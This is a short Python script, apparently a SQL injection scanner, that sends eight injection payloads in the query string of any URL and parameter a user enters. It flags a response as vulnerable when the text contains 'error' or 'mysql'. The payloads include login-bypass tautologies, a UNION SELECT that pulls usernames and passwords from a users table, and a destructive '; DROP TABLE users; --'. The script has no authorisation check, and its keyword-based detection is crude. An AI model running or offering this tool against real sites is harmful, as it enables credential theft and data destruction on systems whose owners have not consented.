import requests

# List of common SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' AND '1'='1",
    "' AND '1'='1' -- ",
    "' AND '1'='1' /*",
    "' UNION SELECT NULL, username, password FROM users -- ",
    "'; DROP TABLE users; -- "
]

def test_sql_injection(url, param):
    for payload in payloads:
        # Construct the URL with the payload
        injection_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(injection_url)
            # Check for common indicators of SQL injection
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                print(f"Response URL: {injection_url}")
            else:
                print(f"No vulnerability found with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/artists.php): ")
    parameter = input("Enter the parameter to test (e.g., artist): ")
    test_sql_injection(target_url, parameter)
